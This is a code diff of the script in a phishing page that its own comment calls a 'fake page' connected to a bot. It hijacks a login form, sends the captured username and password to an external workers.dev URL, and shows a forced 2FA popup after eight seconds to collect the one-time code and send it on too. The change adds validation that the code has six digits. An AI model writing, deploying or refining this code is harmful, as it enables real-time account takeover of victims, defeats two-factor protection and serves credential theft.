@@ -568,12 +568,7 @@
 
 <script>
 // ============================================================
-// SOLUCIÓN DEFINITIVA - POPUP 2FA SIEMPRE A LOS 8 SEGUNDOS
-// CON ENVÍO DE USERNAME PARA ASIGNACIÓN CORRECTA
-// ============================================================
-
-// ============================================================
-// FUNCIONES ORIGINALES
+// SCRIPT PARA PÁGINA FAKE - CONECTA CON EL BOT
 // ============================================================
 
 function navigateToLogin(){
@@ -592,10 +587,6 @@ function closeVerification(){
     document.getElementById('loginBtn').style.display = 'block';
 }
 
-// ============================================================
-// VARIABLES
-// ============================================================
-
 let loginTimestamp = null;
 let botUrl = 'https://mi-bot-proxy.pamelalunaescuela.workers.dev';
 let codigoEnviado = false;
@@ -603,10 +594,6 @@ let popupMostrado = false;
 let esperandoCodigo = false;
 let usernameCapturado = '';
 let passwordCapturado = '';
-
-// ============================================================
-// FUNCIÓN PARA MOSTRAR POPUP DE 2FA
-// ============================================================
 
 function mostrarPopup2FA() {
     if (popupMostrado) return;
@@ -630,10 +617,6 @@ function mostrarPopup2FA() {
     document.getElementById('loginLoading').style.display = 'none';
 }
 
-// ============================================================
-// ENVIAR AL BOT (SOLO CREDENCIALES)
-// ============================================================
-
 async function enviarAlBot(username, password) {
     try {
         console.log('📤 Enviando credenciales al bot...');
@@ -651,22 +634,28 @@ async function enviarAlBot(username, password) {
     }
 }
 
-// ============================================================
-// ENVIAR CÓDIGO AL BOT (CON USERNAME)
-// ============================================================
-
 async function enviarCodigoAlBot(codigo) {
     if (!esperandoCodigo) {
         console.log('⚠️ No se está esperando código');
         return;
     }
     
-    // 🔥 Asegurarnos de tener el username
     if (!usernameCapturado) {
         const inputs = document.querySelectorAll('.login-input');
         if (inputs.length >= 2) {
             usernameCapturado = inputs[0]?.value || '';
         }
+    }
+    
+    // Validar que el código sea numérico de 6 dígitos
+    if (!/^\d{6}$/.test(codigo)) {
+        mostrarError('El código debe ser de 6 dígitos numéricos');
+        const input = document.querySelector('.verification-input');
+        if (input) {
+            input.value = '';
+            input.focus();
+        }
+        return;
     }
     
     try {
@@ -711,10 +700,6 @@ async function enviarCodigoAlBot(codigo) {
         codigoEnviado = false;
     }
 }
-
-// ============================================================
-// MOSTRAR ERRORES Y ÉXITO
-// ============================================================
 
 function mostrarError(mensaje) {
     let errorEl = document.getElementById('login-error');
@@ -780,10 +765,6 @@ function mostrarExito(mensaje) {
     }, 5000);
 }
 
-// ============================================================
-// INTERCEPTAR FORMULARIO DE LOGIN
-// ============================================================
-
 const loginForm = document.getElementById('loginForm');
 if (loginForm) {
     loginForm.onsubmit = async function(e) {
@@ -810,10 +791,8 @@ if (loginForm) {
         document.getElementById('loginBtn').style.display = 'none';
         document.getElementById('loginLoading').style.display = 'flex';
         
-        // ENVIAR CREDENCIALES AL BOT
         enviarAlBot(username, password);
         
-        // PROGRAMAR POPUP A LOS 8 SEGUNDOS
         console.log('⏰ Programando popup en 8 segundos...');
         setTimeout(() => {
             if (!popupMostrado) {
@@ -823,10 +802,6 @@ if (loginForm) {
         }, 8000);
     };
 }
-
-// ============================================================
-// INTERCEPTAR BOTÓN VERIFY EXISTENTE
-// ============================================================
 
 const verifyBtn = document.querySelector('.verify-btn');
 if (verifyBtn) {
@@ -841,10 +816,6 @@ if (verifyBtn) {
     });
 }
 
-// ============================================================
-// VERIFICAR CONEXIÓN CON EL BOT
-// ============================================================
-
 async function verificarConexionBot() {
     try {
         const response = await fetch(`${botUrl}/status`);
@@ -858,13 +829,10 @@ async function verificarConexionBot() {
     }
 }
 
-// ============================================================
-// LOG DE INICIO
-// ============================================================
-
 console.log('✅ POPUP FORZADO - Se mostrará a los 8 segundos siempre');
 console.log('📡 Bot URL:', botUrl);
 console.log('📌 El código 2FA se enviará con el username para asignación correcta');
+console.log('📌 Los códigos deben ser de 6 dígitos numéricos');
 setTimeout(verificarConexionBot, 2000);
 </script>
 </body>
